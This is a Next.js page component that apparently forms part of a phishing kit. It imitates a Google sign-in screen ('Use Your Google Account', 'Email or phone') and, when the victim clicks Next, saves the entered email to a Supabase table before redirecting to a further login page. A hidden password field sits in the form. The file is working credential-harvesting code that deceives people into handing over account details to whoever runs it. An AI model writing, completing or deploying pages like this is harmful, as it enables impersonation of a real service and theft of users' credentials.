"use client";

import { useRef, useEffect } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { supabase } from "@/lib/supabase";

export default function Home() {
const router = useRouter();
  const emailRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);
  const checkboxRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const checkbox = checkboxRef.current;
    const password = passwordRef.current;

    if (checkbox && password) {
      const handleClick = () => {
        password.type = password.type === "password" ? "text" : "password";
      };
      checkbox.addEventListener("click", handleClick);
      return () => checkbox.removeEventListener("click", handleClick);
    }
  }, []);

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    const email = emailRef.current?.value;

    if (!email) return alert("Email is required");

    const { error } = await supabase.from("user").insert([{ email }]);
    if (error) {
      console.error(error);
      return alert("Failed to save email");
    }

    localStorage.setItem("user_email", email);
    router.push("/login");
  };
  return (
    <div className="box">
      <form action="#" className="form">
        <div className="!space-y-5">
          <Image
            className="!size-10"
            src="/icon.png"
            alt="Logo"
            width={100}
            height={100}
          />
          <h1 className="form-title !text-3xl !font-normal">Login</h1>
          <p className="text-lg !mb-7">Use Your Google Account</p>
        </div>

        <div className="form-group mb-0">
          <input type="text" ref={emailRef} className="form-control" required />
          <label className="form-label">Email or phone</label>
        </div>
        <div className="bottom-box !mt-2">
          <a href="#">Forgot Email?</a>
        </div>
        <div className="hidden">
          <div className="form-group">
            <input
              type="password"
              className="form-control"
              required
              id="txtPassword"
              ref={passwordRef}
            />
            <label htmlFor="" className="form-label">
              Enter Your Password
            </label>
          </div>

          <div className="form-group">
            <label className="showLabel">
              <input type="checkbox" id="show" ref={checkboxRef} />
              Show Password
            </label>
          </div>
        </div>

        <div className="bottom-box">
          <a href="#">Create an Account</a>
          <button className="form-button !rounded-full" onClick={handleNext}>
            Next
          </button>
        </div>
      </form>
    </div>
  );
}
